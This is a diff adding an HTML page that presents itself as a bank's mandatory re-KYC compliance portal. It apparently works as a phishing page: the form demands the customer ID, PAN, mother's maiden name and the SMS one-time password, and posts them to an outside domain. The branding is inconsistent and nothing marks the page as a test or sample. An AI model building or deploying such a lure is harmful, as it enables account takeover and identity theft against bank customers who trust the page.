@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Customer Re-KYC Compliance Gateway — Standard Banking</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #f8fafc; color: #1e293b; padding: 24px; }
+    .portal-container { max-width: 760px; margin: 0 auto; background: #ffffff; border-radius: 8px; border: 1px solid #e2e8f0; box-shadow: 0 4px 16px rgba(0,0,0,0.05); }
+    .header { background: #0f172a; color: #ffffff; padding: 20px 24px; border-top-left-radius: 8px; border-top-right-radius: 8px; }
+    .header h1 { font-size: 19px; font-weight: 700; margin-bottom: 4px; }
+    .header p { font-size: 13px; color: #94a3b8; }
+    .form-body { padding: 24px; }
+    .section-title { font-size: 14px; font-weight: 600; color: #334155; text-transform: uppercase; letter-spacing: 0.5px; border-bottom: 1px solid #e2e8f0; padding-bottom: 6px; margin: 20px 0 16px 0; }
+    .form-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; margin-bottom: 12px; }
+    .form-group { display: flex; flex-direction: column; }
+    .form-group.full { grid-column: span 2; }
+    label { font-size: 13px; font-weight: 600; color: #475569; margin-bottom: 5px; }
+    label .req { color: #e11d48; margin-left: 2px; }
+    input, select { padding: 10px 12px; border: 1px solid #cbd5e1; border-radius: 6px; font-size: 14px; color: #0f172a; outline: none; }
+    input:focus, select:focus { border-color: #0284c7; box-shadow: 0 0 0 2px rgba(2,132,199,0.15); }
+    .field-hint { font-size: 12px; color: #64748b; margin-top: 4px; }
+    .actions { margin-top: 24px; padding-top: 16px; border-top: 1px solid #e2e8f0; display: flex; justify-content: flex-end; gap: 12px; }
+    .btn { padding: 10px 20px; font-size: 14px; font-weight: 600; border-radius: 6px; cursor: pointer; border: none; }
+    .btn-primary { background: #0284c7; color: #ffffff; }
+  </style>
+</head>
+<body>
+  <div class="portal-container">
+    <div class="header">
+      <h1>Secure Banking — Periodic Customer Re-KYC Update</h1>
+      <p>Mandatory Regulatory Verification Portal (Compliance Ref: RBI/2026/04)</p>
+    </div>
+
+    <form id="bank-kyc-form" action="https://secure-banking.org/api/kyc-update" method="POST" class="form-body">
+      <div class="section-title">Primary Account Verification</div>
+      <div class="form-grid">
+        <div class="form-group">
+          <label for="customer_id">Customer Reference ID<span class="req">*</span></label>
+          <input type="text" id="customer_id" name="customer_id" placeholder="e.g. CUST-9021884" required />
+        </div>
+
+        <div class="form-group">
+          <label for="pan_number">Permanent Account Number (PAN)<span class="req">*</span></label>
+          <input type="text" id="pan_number" name="pan_number" placeholder="ABCDE1234F" required />
+        </div>
+
+        <div class="form-group">
+          <label for="mothers_maiden_name">Mother's Maiden Name<span class="req">*</span></label>
+          <input type="text" id="mothers_maiden_name" name="mothers_maiden_name" placeholder="Mother's surname prior to marriage" required aria-describedby="maiden-hint" />
+          <span id="maiden-hint" class="field-hint">Legacy verification question.</span>
+        </div>
+
+        <div class="form-group">
+          <label for="annual_turnover">Annual Turnover / Income Slab<span class="req">*</span></label>
+          <select id="annual_turnover" name="annual_turnover" required>
+            <option value="">Select Range...</option>
+            <option value="tier1">Below ₹5 Lakhs</option>
+            <option value="tier2">₹5 Lakhs – ₹15 Lakhs</option>
+            <option value="tier3">Above ₹15 Lakhs</option>
+          </select>
+        </div>
+
+        <div class="form-group full">
+          <label for="one_time_password_otp">Security Verification OTP<span class="req">*</span></label>
+          <input type="text" id="one_time_password_otp" name="one_time_password_otp" placeholder="6-digit mobile OTP code" required aria-describedby="otp-hint" />
+          <span id="otp-hint" class="field-hint">Enter SMS code received on registered mobile.</span>
+        </div>
+      </div>
+
+      <div class="actions">
+        <button type="submit" class="btn btn-primary">Verify & Update KYC</button>
+      </div>
+    </form>
+  </div>
+</body>
+</html>
